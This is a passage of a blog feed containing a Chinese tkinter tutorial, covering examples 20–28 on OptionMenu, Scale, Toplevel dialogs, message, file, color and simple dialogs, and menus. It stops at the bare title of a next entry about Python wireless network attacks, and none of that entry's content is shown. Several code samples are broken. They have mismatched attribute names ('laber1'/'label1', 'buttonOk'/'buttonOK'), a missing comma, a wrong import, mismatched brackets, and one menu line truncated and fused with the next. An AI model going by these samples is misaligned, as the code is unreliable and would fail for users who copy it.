punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        tk<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>createWidget<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">createWidget</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        optionList<span class="token operator">=</span>range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">61</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>vFont<span class="token operator">=</span>tk<span class="token punctuation">.</span>StringVar<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>vFont<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置初始值</span>        self<span class="token punctuation">.</span>optionMenuFont<span class="token operator">=</span>tk<span class="token punctuation">.</span>OptionMenu<span class="token punctuation">(</span>self<span class="token punctuation">,</span>self<span class="token punctuation">.</span>vFont<span class="token punctuation">,</span><span class="token operator">*</span>optionList<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>optionMenuFont<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tk<span class="token punctuation">.</span>LEFT<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>buttonFont<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'改变字体'</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>changefont<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>buttonFont<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tk<span class="token punctuation">.</span>LEFT<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>lblTitle<span class="token operator">=</span>tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'Hello'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Helvetica'</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token string">'bold'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>lblTitle<span class="token punctuation">.</span>pack<span class="token punctuation">(</span>side<span class="token operator">=</span>tk<span class="token punctuation">.</span>LEFT<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">changefont</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义事件处理程序：改变字体</span>        fontNew<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Helvetica'</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>vFont<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'bold'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>lblTitle<span class="token punctuation">.</span>config<span class="token punctuation">(</span>font<span class="token operator">=</span>fontNew<span class="token punctuation">)</span>root<span class="token operator">=</span>tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'设置字体大小'</span><span class="token punctuation">)</span>root<span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">400</span>root<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">50</span>app<span class="token operator">=</span>Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>移动滑块Scale</li></ul><p><strong>例20：Scale示例：移动滑块，改变字体大小</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token operator">=</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>        tk<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>createWidget<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">createWidget</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>scaleFont<span class="token operator">=</span>tk<span class="token punctuation">.</span>Scale<span class="token punctuation">(</span>self<span class="token punctuation">,</span>from_<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">,</span>to<span class="token operator">=</span><span class="token number">60</span><span class="token punctuation">,</span>length<span class="token operator">=</span><span class="token number">400</span>            orient<span class="token operator">=</span>tk<span class="token punctuation">.</span>HORIZONTAL<span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>changefont<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>scaleFont<span class="token punctuation">.</span>set<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置初始值</span>        self<span class="token punctuation">.</span>scaleFont<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>lblTitle<span class="token operator">=</span>tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'Hello'</span><span class="token punctuation">,</span>font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Helvetica'</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token string">'bold'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>lblTitle<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">changefont</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">:</span>        fontNew<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Helvetica'</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>scaleFont<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'bold'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>lblTitle<span class="token punctuation">.</span>config<span class="token punctuation">(</span>font<span class="token operator">=</span>fontNew<span class="token punctuation">)</span>root<span class="token operator">=</span>tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'设置字体大小'</span><span class="token punctuation">)</span>root<span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">400</span>root<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">50</span>app<span class="token operator">=</span>Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><ul><li>顶层窗口Toplevel<ul><li>常用在显示额外的窗口、对话框或者其它弹出窗口</li></ul></li></ul><p><strong>例21：使用Toplevel，实现自定义关于对话框</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">class</span> <span class="token class-name">MyDialog</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>top<span class="token operator">=</span>tk<span class="token punctuation">.</span>Toplevel<span class="token punctuation">(</span>master<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#生产Toplevel组件</span>        self<span class="token punctuation">.</span>laber1<span class="token operator">=</span>tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">.</span>top<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'版权所有'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>label1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>label2<span class="token operator">=</span>tk<span class="token punctuation">.</span>Label<span class="token punctuation">(</span>self<span class="token punctuation">.</span>top<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'V 1.0.0'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>label2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>buttonOk<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">.</span>top<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'OK'</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>funcOK<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>buttonOK<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">funcOK</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>top<span class="token punctuation">.</span>destroy<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#销毁对话框</span><span class="token keyword">class</span> <span class="token class-name">Application</span><span class="token punctuation">(</span>tk<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token punctuation">)</span><span class="token punctuation">:</span>        tk<span class="token punctuation">.</span>Frame<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span>master<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>createWidget<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">createWidget</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>btnAbout<span class="token operator">=</span>tk<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>self<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"About"</span><span class="token punctuation">,</span>command<span class="token operator">=</span>self<span class="token punctuation">.</span>funcAbout<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>btnAbout<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">funcAbout</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        d<span class="token operator">=</span>MyDialog<span class="token punctuation">(</span>self<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建对话框</span>root<span class="token operator">=</span>tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">[</span><span class="token string">'width'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">400</span>root<span class="token punctuation">[</span><span class="token string">'height'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">50</span>app<span class="token operator">=</span>Application<span class="token punctuation">(</span>master<span class="token operator">=</span>root<span class="token punctuation">)</span>app<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="7-对话框"><a href="#7-对话框" class="headerlink" title="7.对话框"></a>7.对话框</h3><ul><li>messagebox、filedialog、colorchooser、simpledialog</li><li>通用消息对话框<ul><li>askokcancel(title=None,message=None,**options): OK/Cancel对话框</li><li>askquestion(title=None,message=None,**options): Yes/No问题对话框</li><li>askretrycancel(title=None,message=None,**options): Retry/Cancel对话框</li><li>askyesno(title=None,message=None,**options): Yes/No 是/否对话框</li><li>showerror(title=None,message=None,**options): 错误消息对话框</li><li>showinfo(title=None,message=None,**options): 信息消息对话框</li><li>showwarning(title=None,message=None,**options): 警告消息对话框</li></ul></li></ul><p><strong>例22：OptionMenu通用消息对话框示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter<span class="token punctuation">.</span>messagebox <span class="token keyword">import</span> <span class="token operator">*</span>r1<span class="token operator">=</span>askokcancel<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'askokcancel'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'是否放弃修改的内容？'</span><span class="token punctuation">)</span>r2<span class="token operator">=</span>askquestion<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'askquestion'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'是否放弃修改的内容？'</span><span class="token punctuation">)</span>r3<span class="token operator">=</span>askyesno<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'askyesno'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'是否放弃修改的内容？'</span><span class="token punctuation">)</span>r4<span class="token operator">=</span>askretrycancel<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'askretrycancel'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'系统忙，是否重试？'</span><span class="token punctuation">)</span>showerror<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'showerror'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'无法连接！'</span><span class="token punctuation">)</span>showinfo<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'showinfo'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'连接成功！'</span><span class="token punctuation">)</span>showwarning<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'showwarning'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'磁盘碎片过多！'</span><span class="token punctuation">)</span></code></pre><ul><li>文件对话框filedialog<ul><li>askdirectory(**options): 打开目录对话框，返回目录名</li><li>askopenfile(**options): 打开文件对话框，返回打开的文件对象</li><li>askopenfiles(**options): 打开文件对话框，返回打开的文件对象列表</li><li>askopenfilename(**options): 打开文件对话框，返回打开的文件名</li><li>askopenfilenames(**options): 打开文件对话框，返回打开的文件名列表</li><li>asksaveasfile(mode=’w’,**options): 打开保存对话框，返回保存的文件名</li><li>asksaveasfilename(mode=’w’,**options): 打开保存对话框，返回保存的文件名</li></ul></li></ul><p><strong>例23：文件对话框示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>f<span class="token operator">=</span>askopenfilename<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'askopenfilename'</span><span class="token punctuation">,</span>filetypes<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'Python源文件'</span><span class="token punctuation">,</span><span class="token string">'.py'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'网页文件'</span><span class="token punctuation">,</span><span class="token string">'.htm/html'</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><ul><li>颜色选择对话框colorchooser<ul><li>askcolor(color=None,**options)    #打开颜色选择对话框</li></ul></li></ul><p><strong>例24：颜色对话框示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter<span class="token punctuation">.</span>colorchooser <span class="token keyword">import</span> <span class="token operator">*</span>c<span class="token operator">=</span>askcolor<span class="token punctuation">(</span>color<span class="token operator">=</span><span class="token string">'red'</span><span class="token punctuation">,</span>title<span class="token operator">=</span><span class="token string">'askcolor'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#((0.0,0.0,255.99609375),'#0000ff)</span></code></pre><ul><li>简单对话框simpledialog</li></ul><p><strong>例25：简单对话框示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> tkinter<span class="token punctuation">.</span>simpledialog <span class="token keyword">import</span> <span class="token operator">*</span>i<span class="token operator">=</span>askinteger<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'请输入'</span><span class="token punctuation">,</span>prompt<span class="token operator">=</span><span class="token string">'请输入整数:'</span><span class="token punctuation">,</span>initialvalue<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span>f<span class="token operator">=</span>askfloat<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'请输入'</span><span class="token punctuation">,</span>prompt<span class="token operator">=</span><span class="token string">'请输入实数:'</span><span class="token punctuation">)</span>s<span class="token operator">=</span>askstring<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">'请输入'</span><span class="token punctuation">,</span>prompt<span class="token operator">=</span><span class="token string">'请输入字符串:'</span><span class="token punctuation">)</span></code></pre><p><strong>例26：通用简单对话框示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">from</span> tkinter<span class="token punctuation">.</span>simpledialog <span class="token keyword">import</span> <span class="token operator">*</span>dlg<span class="token operator">=</span>SimpleDialog<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">'继续？'</span><span class="token punctuation">,</span>buttons<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'Yes'</span><span class="token punctuation">,</span><span class="token string">'No'</span><span class="token punctuation">,</span><span class="token string">'cancel'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>default<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#创建SimpleDialog组件 默认停在'Yes'按钮</span></code></pre><h3 id="8-菜单和工具栏"><a href="#8-菜单和工具栏" class="headerlink" title="8.菜单和工具栏"></a>8.菜单和工具栏</h3><ul><li>主菜单：提供窗体的菜单系统。通过单击可下拉出子菜单，选择命令可执行相关的操作。常用的主菜单通常包括：文件、编辑、视图、帮助等</li><li>上下文菜单（也称为快捷菜单）：通过鼠标右击某对象而弹出的菜单，一般为与该对象相关的常用菜单命令。例如：剪切、复制、粘贴等</li><li>工具栏：提供窗体的工具栏。通过单击工具栏上的图标，可以执行相关的操作</li></ul><p><strong>例27：主菜单示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">def</span> <span class="token function">f_print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tk<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">'信息'</span><span class="token punctuation">,</span><span class="token string">'打印功能'</span><span class="token punctuation">)</span>root<span class="token operator">=</span>tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建1个Tk根窗口组件root</span><span class="token comment" spellcheck="true">#创建主菜单栏</span>menubar<span class="token operator">=</span>tk<span class="token punctuation">.</span>Menu<span class="token punctuation">(</span>root<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建主菜单栏menubar</span><span class="token comment" spellcheck="true">#创建子菜单</span>menufile<span class="token operator">=</span>tk<span class="token punctuation">.</span>Menu<span class="token punctuation">(</span>menubar<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建菜单menufile</span>menuedit<span class="token operator">=</span>tk<span class="token punctuation">.</span>Menu<span class="token punctuation">(</span>menubar<span class="token punctuation">,</span>tearoff<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#默认tearoff=1，如果为0，子菜单可拖动</span>menuhelp<span class="token operator">=</span>tk<span class="token punctuation">.</span>Menu<span class="token punctuation">(</span>menubar<span class="token punctuation">,</span>tearoff<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>menuTest<span class="token operator">=</span>tk<span class="token punctuation">.</span>Menu<span class="token punctuation">(</span>menubar<span class="token punctuation">)</span>menubar<span class="token punctuation">.</span>add_cascade<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"File"</span><span class="token punctuation">,</span>menu<span class="token operator">=</span>menufile<span class="token punctuation">)</span>menubar<span class="token punctuation">.</span>add_cascade<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"Edit"</span><span class="token punctuation">,</span>menu<span class="token operator">=</span>menuedit<span class="token punctuation">)</span>menubar<span class="token punctuation">.</span>add_cascade<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"Help"</span><span class="token punctuation">,</span>menu<span class="token operator">=</span>menuhelp<span class="token punctuation">)</span>menubar<span class="token punctuation">.</span>add_cascade<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"菜单2"</span><span class="token punctuation">,</span>menu<span class="token operator">=</span>menuTest<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#添加菜单项</span>menufile<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">'Open'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#添加菜单项</span>menufile<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">'Save'</span><span class="token punctuation">)</span>menufile<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">'Print'</span><span class="token punctuation">,</span>accelerator<span class="token operator">=</span><span class="token string">'^p'</span><span class="token punctuation">,</span>comenufile<span class="token punctuation">.</span>add_separator<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#添加分隔符</span>menufile<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">'Exit'</span><span class="token punctuation">)</span>menuedit<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">'Cut'</span><span class="token punctuation">)</span>menuedit<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">'Copy'</span><span class="token punctuation">)</span>menuedit<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">'Paste'</span><span class="token punctuation">)</span>menuhelp<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">'About'</span><span class="token punctuation">)</span>menuTest<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"菜单项1"</span><span class="token punctuation">)</span>menuTest<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"菜单项2"</span><span class="token punctuation">)</span>menuTest<span class="token punctuation">.</span>add_separator<span class="token punctuation">(</span><span class="token punctuation">)</span>menuTest<span class="token punctuation">.</span>add_checkbutton<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"复选框菜单项1"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#添加复选框</span>menuTest<span class="token punctuation">.</span>add_checkbutton<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"复选框菜单项2"</span><span class="token punctuation">)</span>menuTest<span class="token punctuation">.</span>add_separator<span class="token punctuation">(</span><span class="token punctuation">)</span>menuTest<span class="token punctuation">.</span>add_radiobutton<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"单选按钮菜单项1"</span><span class="token punctuation">)</span>menuTest<span class="token punctuation">.</span>add_radiobutton<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"单选按钮菜单项2"</span><span class="token punctuation">)</span>menusub<span class="token operator">=</span>tk<span class="token punctuation">.</span>Menu<span class="token punctuation">(</span>menuTest<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建子菜单</span>menuTest<span class="token punctuation">.</span>add_cascade<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"子菜单"</span><span class="token punctuation">,</span>menu<span class="token operator">=</span>menusub<span class="token punctuation">)</span>menusub<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"子菜单项1"</span><span class="token punctuation">)</span>menusub<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"子菜单项2"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#附加主菜单到根窗口</span>root<span class="token punctuation">[</span><span class="token string">'menu'</span><span class="token punctuation">]</span><span class="token operator">=</span>menubar    <span class="token comment" spellcheck="true">#附加主菜单到根窗口</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><strong>例28：上下文菜单示例</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> tkinter <span class="token keyword">as</span> tk<span class="token keyword">def</span> <span class="token function">popup</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>    menubar<span class="token punctuation">.</span>post<span class="token punctuation">(</span>event<span class="token punctuation">.</span>x_root<span class="token punctuation">,</span>event<span class="token punctuation">.</span>y_root<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#鼠标右键位置显示菜单</span>root<span class="token operator">=</span>tk<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建1个Tk根窗口组件root</span><span class="token comment" spellcheck="true">#创建菜单</span>menubar<span class="token operator">=</span>tk<span class="token punctuation">.</span>Menu<span class="token punctuation">(</span>root<span class="token punctuation">)</span>menubar<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"Font"</span><span class="token punctuation">)</span>menuedit<span class="token operator">=</span>tk<span class="token punctuation">.</span>Menu<span class="token punctuation">(</span>menubar<span class="token punctuation">,</span>tearoff<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>menubar<span class="token punctuation">.</span>add_cascade<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"Edit"</span><span class="token punctuation">,</span>menu<span class="token operator">=</span>menuedit<span class="token punctuation">)</span>menuedit<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"Copy"</span><span class="token punctuation">)</span>menuedit<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"Cut"</span><span class="token punctuation">)</span>menuedit<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span>label<span class="token operator">=</span><span class="token string">"Paste"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#创建界面</span>textEdit<span class="token operator">=</span>tk<span class="token punctuation">.</span>Text<span class="token punctuation">(</span>root<span class="token punctuation">,</span>width<span class="token operator">=</span><span class="token number">40</span><span class="token punctuation">,</span>height<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建Text组件</span>textEdit<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token string">'&lt;Button-3>'</span><span class="token punctuation">,</span>popup<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#绑定事件</span><span class="token comment" spellcheck="true">#附加主菜单到根窗口(没有实现)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>3/28/2021 8:18:20 PM </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python无线网络攻击</title>
      <link href="2021/03/27/python-wu-xian-wang-luo-gong-ji/"/>
      <url>2021/03/27/python-wu-xian-wang-luo-gong-ji/</url>
      
